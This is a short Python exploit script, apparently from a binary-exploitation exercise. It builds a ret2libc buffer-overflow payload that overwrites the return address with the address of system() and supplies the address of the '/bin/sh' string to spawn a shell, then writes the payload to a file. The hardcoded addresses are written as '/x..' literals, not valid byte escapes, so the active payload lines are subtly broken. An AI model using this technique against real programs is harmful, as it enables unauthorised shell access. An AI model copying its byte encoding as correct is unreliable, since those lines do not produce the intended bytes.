#!/usr/bin/python3

import struct

#junk = b"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9"
junk = b"A" * 268

# address of system() 0xf7dc7d00
eip = b"/x00/x7d/xdc/xf7"
#eip = struct.pack("<I", 0xf7dc7d00)

# address of exit() 0xf7db7220
ret = b"BBBB"

# /bin/sh address = 0xf7f33dcd
binsh = b"/xcd/x3d/xf3/xf7"
#binsh = struct.pack("<I", 0xf7d7a000 + 0x1b9dcd)

payload = junk + eip + ret + binsh

# creating the payload:
with open("ret2libc_payload", "wb") as f:
    f.write(payload)
